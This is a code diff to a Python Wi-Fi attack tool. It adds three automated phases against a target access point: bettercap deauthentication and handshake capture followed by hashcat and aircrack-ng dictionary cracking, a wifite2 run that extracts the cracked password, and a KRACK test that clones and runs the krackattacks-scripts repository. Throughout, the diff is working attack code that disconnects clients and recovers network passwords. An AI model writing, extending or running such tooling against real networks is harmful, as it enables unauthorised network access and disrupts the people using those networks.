@@ -18,7 +18,7 @@ from .system import (
     disable_monitor_mode,
     get_hashcat_dir,
 )
-from . import aircrack, hashcat_tool, hcx
+from . import aircrack, hashcat_tool, hcx, krack as krack_tool, wifite as wifite_tool
 
 
 @dataclass
@@ -115,13 +115,25 @@ class UnifiedAttacker:
             # Route by encryption type
             if "WEP" in enc:
                 password = self._phase_wep()
+                # Wifite2 as fallback for WEP (Linux only)
+                if not password and not self._stop.is_set():
+                    password = self._phase_wifite()
             else:
                 # 1. PMKID (clientless — no associated client required)
                 if not self._stop.is_set() and check_tool("hashcat"):
                     password = self._phase_pmkid()
-                # 2. 4-Way handshake + dictionary
+                # 2. 4-Way handshake + dictionary (airodump-ng + deauth)
                 if not password and not self._stop.is_set():
                     password = self._phase_handshake()
+                # 3. Bettercap handshake capture (alternative capture path)
+                if not password and not self._stop.is_set():
+                    password = self._phase_bettercap()
+                # 4. Wifite2 automated auditor — also covers WPS (Linux only)
+                if not password and not self._stop.is_set():
+                    password = self._phase_wifite()
+                # 5. KRACK vulnerability assessment (result logged, no password)
+                if not self._stop.is_set():
+                    self._phase_krack()
 
         finally:
             if self._monitor_iface and self._monitor_iface != self.interface:
@@ -429,3 +441,192 @@ class UnifiedAttacker:
 
         self._log("Handshake attack exhausted wordlist", "warn")
         return None
+
+    # ------------------------------------------------------------------
+    # Phase: Bettercap handshake capture
+    # ------------------------------------------------------------------
+
+    def _phase_bettercap(self) -> Optional[str]:
+        self._log("--- Phase: Bettercap Handshake Capture ---", "phase")
+
+        if not check_tool("bettercap"):
+            self._log("bettercap not found -- skipping", "warn")
+            return None
+
+        cap_file = self._prefix("bettercap_hs.pcap")
+        hash_file = self._prefix("bettercap_hs.hc22000")
+
+        self._log(f"Capturing handshake via bettercap on '{self.target.ssid}'...", "info")
+
+        # Script bettercap: save handshakes, recon on, deauth target, wait, quit
+        eval_cmds = (
+            f"set wifi.handshakes.file {cap_file}; "
+            f"wifi.recon on; "
+            f"sleep 5; "
+            f"wifi.deauth {self.target.bssid}; "
+            f"sleep {self.CAPTURE_SECS - 5}; "
+            f"quit"
+        )
+        self._stream(
+            ["bettercap", "-iface", self._monitor_iface, "-eval", eval_cmds],
+            timeout=self.CAPTURE_SECS + 15,
+        )
+
+        if self._stop.is_set():
+            return None
+
+        if not Path(cap_file).exists() or Path(cap_file).stat().st_size == 0:
+            self._log("Bettercap produced no capture data", "warn")
+            return None
+
+        if not self.wordlist:
+            self._log("No wordlist -- skipping crack of bettercap capture", "warn")
+            return None
+
+        # Crack with hashcat, then aircrack-ng fallback
+        ok, _ = hashcat_tool.convert_pcap(cap_file, hash_file)
+        hash_path = Path(hash_file)
+        if check_tool("hashcat") and ok and hash_path.exists() and hash_path.stat().st_size > 0:
+            self._log(f"hashcat -m 22000 on bettercap capture...", "info")
+            self._stream(
+                ["hashcat", "-m", "22000", hash_file, self.wordlist, "--force", "--quiet"],
+                timeout=self.CRACK_TIMEOUT,
+                cwd=get_hashcat_dir(),
+            )
+            if not self._stop.is_set():
+                ok, out = hashcat_tool.show_cracked(hash_file, 22000)
+                if ok and out.strip():
+                    password = out.strip().split(":")[-1]
+                    self._log(f"Bettercap capture cracked -- password: {password}", "success")
+                    return password
+
+        if check_tool("aircrack-ng") and not self._stop.is_set():
+            self._log("aircrack-ng dictionary attack on bettercap capture...", "info")
+            ok, _, key = aircrack.crack_wpa(
+                cap_file, self.wordlist,
+                bssid=self.target.bssid, ssid=self.target.ssid,
+            )
+            if key:
+                self._log(f"Bettercap capture cracked (aircrack) -- password: {key}", "success")
+                return key
+
+        self._log("Bettercap capture exhausted wordlist", "warn")
+        return None
+
+    # ------------------------------------------------------------------
+    # Phase: Wifite2 automated auditor
+    # ------------------------------------------------------------------
+
+    def _phase_wifite(self) -> Optional[str]:
+        self._log("--- Phase: Wifite2 Automated Attack ---", "phase")
+
+        if not wifite_tool.is_available():
+            self._log(
+                "wifite not available (Linux only, requires airmon-ng) -- skipping", "warn"
+            )
+            return None
+
+        if not self.wordlist:
+            self._log("No wordlist -- wifite will attempt WPS/PMKID only", "warn")
+
+        self._log(f"Running wifite2 against '{self.target.ssid}'...", "info")
+        self._log("wifite manages its own capture and cracking", "info")
+
+        cmd = [
+            wifite_tool._find_wifite(),
+            "--interface", self._monitor_iface,
+            "--bssid", self.target.bssid,
+            "--channel", str(self.target.channel),
+            "--kill",
+            "--no-wps",         # handled separately if needed
+            "--wpa",
+        ]
+        if self.wordlist:
+            cmd += ["--dict", self.wordlist]
+
+        password: Optional[str] = None
+
+        try:
+            proc = subprocess.Popen(
+                cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
+                text=True,
+                bufsize=1,
+            )
+            self._current_proc = proc
+            deadline = time.monotonic() + self.CAPTURE_SECS * 3
+
+            for line in iter(proc.stdout.readline, ""):
+                if self._stop.is_set() or time.monotonic() > deadline:
+                    proc.terminate()
+                    break
+                text = line.rstrip()
+                if text:
+                    self._log(text, "output")
+                # Parse wifite2 cracked-password output
+                low = text.lower()
+                if "cracked" in low or "key found" in low:
+                    # Formats: "cracked <SSID> (<password>)" or "password: <pw>"
+                    for marker in ("password:", "cracked", "("):
+                        idx = low.find(marker)
+                        if idx != -1:
+                            candidate = text[idx + len(marker):].strip().strip("()").strip()
+                            if candidate and " " not in candidate:
+                                password = candidate
+                                self._log(f"wifite2 cracked -- password: {password}", "success")
+                                proc.terminate()
+                                break
+
+            try:
+                proc.wait(timeout=5)
+            except subprocess.TimeoutExpired:
+                proc.kill()
+            self._current_proc = None
+
+        except Exception as exc:
+            self._log(str(exc), "error")
+
+        if not password:
+            self._log("wifite2 did not find password", "warn")
+        return password
+
+    # ------------------------------------------------------------------
+    # Phase: KRACK vulnerability assessment
+    # ------------------------------------------------------------------
+
+    def _phase_krack(self) -> None:
+        self._log("--- Phase: KRACK Vulnerability Assessment ---", "phase")
+
+        if IS_WINDOWS:
+            self._log("KRACK test requires hostapd/wpa_supplicant (Linux only) -- skipping", "warn")
+            return
+
+        deps = krack_tool.check_dependencies()
+        missing = [k for k, v in deps.items() if not v]
+        if missing:
+            self._log(f"KRACK dependencies missing: {', '.join(missing)} -- skipping", "warn")
+            return
+
+        script = krack_tool.find_script()
+        if script is None:
+            self._log("krackattacks-scripts not found -- attempting clone...", "info")
+            ok, msg = krack_tool.clone_repo()
+            if not ok:
+                self._log(f"Clone failed: {msg}", "warn")
+                return
+            self._log("Cloned krackattacks-scripts", "success")
+            krack_tool.install_requirements()
+            script = krack_tool.find_script()
+
+        if script is None:
+            self._log("KRACK test script still not found -- skipping", "warn")
+            return
+
+        self._log(f"Running KRACK test against {self.target.bssid}...", "info")
+        self._log("(Tests whether the AP is vulnerable to CVE-2017-13077+)", "info")
+
+        self._stream(
+            [__import__("sys").executable, script, self._monitor_iface, self.target.bssid],
+            timeout=120,
+        )
